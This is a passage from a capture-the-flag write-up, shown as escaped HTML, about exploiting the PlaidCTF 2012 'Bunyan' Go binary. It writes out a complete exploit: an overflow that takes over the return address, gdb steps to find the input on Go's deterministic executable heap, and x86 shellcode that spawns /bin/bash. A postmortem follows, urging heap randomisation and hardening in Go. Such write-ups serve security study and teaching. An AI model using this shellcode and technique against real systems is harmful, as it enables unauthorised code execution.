We will construct an exploit that takes advantage of all of these properties. First, we get get a vulnerability that gives us a crash.
&lt;/p&gt;

&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./webapp --loglevel&lt;span class="o"&gt;=&lt;/span&gt;2 --logfmt&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;AAAAAAAAA%8d&amp;quot;&lt;/span&gt; --address&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:$(perl -e &amp;#39;print &amp;quot;&lt;/span&gt;A&lt;span class="s2"&gt;&amp;quot;x109, &amp;quot;&lt;/span&gt;BBBB&lt;span class="s2"&gt;&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;AAAAAAAAA       1Listening on :AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB&lt;/span&gt;
&lt;span class="go"&gt;unexpected fault address 0x42424242&lt;/span&gt;
&lt;span class="go"&gt;throw: fault&lt;/span&gt;
&lt;span class="go"&gt;[signal 0xb code=0x1 addr=0x42424242 pc=0x42424242]&lt;/span&gt;

&lt;span class="go"&gt;goroutine 1 [syscall]:&lt;/span&gt;
&lt;span class="go"&gt;levellog._Cfunc_Log(0xb736e0b0, 0xb736e0c8)&lt;/span&gt;
&lt;span class="go"&gt;    /tmp/go-build279009652/levellog/_obj/_cgo_defun.c:50 +0x32&lt;/span&gt;
&lt;span class="go"&gt;levellog.Log(0x1, 0x1883cd00, 0x7f)&lt;/span&gt;
&lt;span class="go"&gt;    /tmp/go-build279009652/levellog/_obj/log.cgo1.go:126 +0x140&lt;/span&gt;
&lt;span class="go"&gt;main.main()&lt;/span&gt;
&lt;span class="go"&gt;    /tmp/build/src/webapp/main.go:21 +0x101&lt;/span&gt;

&lt;span class="go"&gt;goroutine 2 [syscall]:&lt;/span&gt;
&lt;span class="go"&gt;created by runtime.main&lt;/span&gt;
&lt;span class="go"&gt;    /usr/local/src/go/src/pkg/runtime/proc.c:221&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now that we have code execution (and we know the vulnerable function due to the helpful stack trace), we &lt;tt&gt;objdump&lt;/tt&gt; the function and put a breakpoint before returning to our clobbered return address.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="mh"&gt;080624d0&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nf"&gt;Log&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;:&lt;/span&gt;
&lt;span class="x"&gt; 80624d0:       81 ec 9c 00 00 00       sub    $0x9c,%esp&lt;/span&gt;
&lt;span class="x"&gt; 80624d6:       8b 84 24 a4 00 00 00    mov    0xa4(%esp),%eax&lt;/span&gt;
&lt;span class="x"&gt; 80624dd:       89 9c 24 94 00 00 00    mov    %ebx,0x94(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 80624e4:       e8 4f 00 00 00          call   8062538 &amp;lt;__i686.get_pc_thunk.bx&amp;gt;&lt;/span&gt;
&lt;span class="x"&gt; 80624e9:       81 c3 17 7b 25 00       add    $0x257b17,%ebx&lt;/span&gt;
&lt;span class="x"&gt; 80624ef:       89 b4 24 98 00 00 00    mov    %esi,0x98(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 80624f6:       8d 74 24 10             lea    0x10(%esp),%esi&lt;/span&gt;
&lt;span class="x"&gt; 80624fa:       89 44 24 0c             mov    %eax,0xc(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 80624fe:       8b 84 24 a0 00 00 00    mov    0xa0(%esp),%eax&lt;/span&gt;
&lt;span class="x"&gt; 8062505:       89 34 24                mov    %esi,(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 8062508:       89 44 24 08             mov    %eax,0x8(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 806250c:       8d 83 00 c3 f2 ff       lea    -0xd3d00(%ebx),%eax&lt;/span&gt;
&lt;span class="x"&gt; 8062512:       89 44 24 04             mov    %eax,0x4(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 8062516:       e8 ad 6c 25 00          call   82b91c8 &amp;lt;sprintf@plt&amp;gt;&lt;/span&gt;
&lt;span class="x"&gt; 806251b:       89 34 24                mov    %esi,(%esp)&lt;/span&gt;
&lt;span class="x"&gt; 806251e:       e8 b5 6c 25 00          call   82b91d8 &amp;lt;puts@plt&amp;gt;&lt;/span&gt;
&lt;span class="x"&gt; 8062523:       8b 9c 24 94 00 00 00    mov    0x94(%esp),%ebx&lt;/span&gt;
&lt;span class="x"&gt; 806252a:       8b b4 24 98 00 00 00    mov    0x98(%esp),%esi&lt;/span&gt;
&lt;span class="x"&gt; 8062531:       81 c4 9c 00 00 00       add    $0x9c,%esp&lt;/span&gt;
&lt;span class="x"&gt; 8062537:       c3                      ret&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;and&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gdb webapp
&lt;span class="go"&gt;GNU gdb (Ubuntu/Linaro 7.3-0ubuntu2) 7.3-2011.08&lt;/span&gt;
&lt;span class="go"&gt;Copyright (C) 2011 Free Software Foundation, Inc.&lt;/span&gt;
&lt;span class="go"&gt;License GPLv3+: GNU GPL version 3 or later&lt;/span&gt;
&lt;span class="go"&gt;This is free software: you are free to change and redistribute it.&lt;/span&gt;
&lt;span class="go"&gt;There is NO WARRANTY, to the extent permitted by law.  Type &amp;quot;show copying&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;and &amp;quot;show warranty&amp;quot; for details.&lt;/span&gt;
&lt;span class="go"&gt;This GDB was configured as &amp;quot;i686-linux-gnu&amp;quot;.&lt;/span&gt;
&lt;span class="go"&gt;For bug reporting instructions, please see:&lt;/span&gt;
&lt;span class="go"&gt;...&lt;/span&gt;
&lt;span class="go"&gt;Reading symbols from /tmp/build/webapp...done.&lt;/span&gt;
&lt;span class="go"&gt;Loading Go Runtime support.&lt;/span&gt;
&lt;span class="go"&gt;(gdb) b *0x8062537&lt;/span&gt;
&lt;span class="go"&gt;Breakpoint 1 at 0x8062537&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We run our exploit again, and then search the heap for our string (we know that the heap is always in the range &lt;tt&gt;[0x18600000, 0x18900000]&lt;/tt&gt; for this binary since Go has a deterministic heap).&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="go"&gt;(gdb) run --loglevel=2 --logfmt=&amp;quot;AAAAAAAAA%8d&amp;quot; --address=&amp;quot;:$(perl -e &amp;#39;print &amp;quot;A&amp;quot;x109, &amp;quot;BBBB&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;Starting program: /tmp/build/webapp --loglevel=2 --logfmt=&amp;quot;AAAAAAAAA%8d&amp;quot; --address=&amp;quot;:$(perl -e &amp;#39;print &amp;quot;A&amp;quot;x109, &amp;quot;BBBB&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;[Thread debugging using libthread_db enabled]&lt;/span&gt;
&lt;span class="go"&gt;[New Thread 0xb7ccbb70 (LWP 7869)]&lt;/span&gt;
&lt;span class="go"&gt;AAAAAAAAA       1Listening on :AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB&lt;/span&gt;

&lt;span class="go"&gt;Breakpoint 1, 0x08062537 in Log ()&lt;/span&gt;
&lt;span class="go"&gt;(gdb) x/a $esp&lt;/span&gt;
&lt;span class="go"&gt;0xbffff1ac: 0x42424242&lt;/span&gt;
&lt;span class="go"&gt;(gdb) find 0x18600000, 0x18900000, 0x42424242&lt;/span&gt;
&lt;span class="go"&gt;0x1883cd7b&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So now we know that our string, which is &lt;tt&gt;:AAAA...AAAABBBB&lt;/tt&gt;, is located at &lt;tt&gt;0x1883cd7b - 4 - 109 = 0x1883cd0e&lt;/tt&gt; on the heap. (Note - this is because string concatenations put strings onto the deterministic heap). But then we are done! We change string to include shell code, and then use our control flow control to jump to it.&lt;/p&gt;
&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./webapp -loglevel&lt;span class="o"&gt;=&lt;/span&gt;100 -logfmt&lt;span class="o"&gt;=&lt;/span&gt;AAAAAAAAA%8d -address&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;$(perl -e &amp;#39; print &amp;quot;&lt;/span&gt;:&lt;span class="se"&gt;\x&lt;/span&gt;6a&lt;span class="se"&gt;\x&lt;/span&gt;0b&lt;span class="se"&gt;\x&lt;/span&gt;58&lt;span class="se"&gt;\x&lt;/span&gt;99&lt;span class="se"&gt;\x&lt;/span&gt;52&lt;span class="se"&gt;\x&lt;/span&gt;66&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;2d&lt;span class="se"&gt;\x&lt;/span&gt;70&lt;span class="se"&gt;\x&lt;/span&gt;89&lt;span class="se"&gt;\x&lt;/span&gt;e1&lt;span class="se"&gt;\x&lt;/span&gt;52&lt;span class="se"&gt;\x&lt;/span&gt;6a&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;2f&lt;span class="se"&gt;\x&lt;/span&gt;62&lt;span class="se"&gt;\x&lt;/span&gt;61&lt;span class="se"&gt;\x&lt;/span&gt;73&lt;span class="se"&gt;\x&lt;/span&gt;68&lt;span class="se"&gt;\x&lt;/span&gt;2f&lt;span class="se"&gt;\x&lt;/span&gt;62&lt;span class="se"&gt;\x&lt;/span&gt;69&lt;span class="se"&gt;\x&lt;/span&gt;6e&lt;span class="se"&gt;\x&lt;/span&gt;89&lt;span class="se"&gt;\x&lt;/span&gt;e3&lt;span class="se"&gt;\x&lt;/span&gt;52&lt;span class="se"&gt;\x&lt;/span&gt;51&lt;span class="se"&gt;\x&lt;/span&gt;53&lt;span class="se"&gt;\x&lt;/span&gt;89&lt;span class="se"&gt;\x&lt;/span&gt;e1&lt;span class="se"&gt;\x&lt;/span&gt;cd&lt;span class="se"&gt;\x&lt;/span&gt;80AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;span class="se"&gt;\x&lt;/span&gt;0e&lt;span class="se"&gt;\x&lt;/span&gt;cd&lt;span class="se"&gt;\x&lt;/span&gt;83&lt;span class="se"&gt;\x&lt;/span&gt;18&lt;span class="s2"&gt;&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
&lt;span class="go"&gt;AAAAAAAAA       1Listening on :j&lt;/span&gt;
&lt;span class="go"&gt;                Xï¿½Rfh-pï¿½ï¿½Rjhh/bash/binï¿½ï¿½RQSï¿½ï¿½Í€AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÍƒ&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;p&gt;
Success!
&lt;/p&gt;
&lt;h3&gt;Postmortem&lt;/h3&gt;
&lt;p&gt;
This exploit is interesting for a number of reasons. First of all, it works on any (32 bit) machine running the same version of Go as the attacker. This is because heap allocations end up being quite deterministic. Next, this type of exploit (jump to an object on the executable heap, such as a string put there via a string concatenation) is something that would be easy to replicate in a variety of Go binaries. Lastly, the executable heap offers an easy surface for heap sprays and other attacks. It is also easy to imagine an expoit that uses a heap overwrite to clobber a closure and get code execution.
&lt;/p&gt;&lt;/p&gt;
&lt;p&gt;
It is also important to note that, while the vulnerability is introduced through C code, common C protections such as NX, ASLR, and libc randomization would make this binary very difficult to exploit without the use of the weak Go runtime. I wish to repeat: &lt;em&gt;this binary is easily exploitable because it is a Go binary&lt;/em&gt;, even assuming ASLR, NX, and libc randomization.
&lt;/p&gt;

&lt;p&gt;
I firmly believe that Go should consider randomizing its heap and making it no longer executable. I also think that it is imperative to provide a compiler option that hardens the binary by disabling the printing of debugging information (stack traces, faulting addresses) on program crashes and stripping debugging / package information from the binary. 
&lt;/p&gt;

&lt;h3&gt;Go Community Response&lt;/h3&gt;

&lt;p&gt;
For anyone who is interested, the Go community's response is &lt;a href="http://groups.google.com/group/golang-nuts/browse_thread/thread/25df6d94d73a8d41"&gt;here&lt;/a&gt;. In summary: vulnerabilities in Go are extremely unlikely so the engineering/complexity overhead required to implement any of these protections is not worth it. I respectfully disagree - vulnerabilities can come from cgo libraries or from as of yet unknown bugs in the Go runtime itself. Furthermore, I suspect that adding ASLR or NX would not require very much effort.
&lt;/p&gt;

&lt;h3&gt;Other writeups&lt;/h3&gt;

&lt;p&gt;
There are writeups of this problem available by:
&lt;ul&gt;
    &lt;li&gt;&lt;a href="http://eindbazen.net/2012/05/plaid-ctf-2012-bunyan/"&gt;Eindbazen&lt;/a&gt; (C style return to libc exploit)&lt;/li&gt;
    &lt;li&gt;&lt;a href="http://www.bases-hacking.org/bunyan-plaidctf2012.html"&gt;w3stormz&lt;/a&gt; (Go heap exploit, in French)&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;h3&gt;tl;dr&lt;/h3&gt;

&lt;p&gt;
Go binaries are compiled with a lot of debug info, which some people might want to strip. The Go heap is executable and deterministic, making the exploitation of the pCTF Bunyan problem relatively straightforward.
&lt;/p&gt;

&lt;p&gt;&lt;span style="display:none;"&gt;Writeup by Alex Reece, see me on &lt;a href="https://plus.google.com/106589059588263736517?rel=author"&gt;Google&lt;/a&gt;+.&lt;/span&gt; &lt;/p&gt;</summary><category term="golang"></category><category term="exploitation"></category></entry></feed>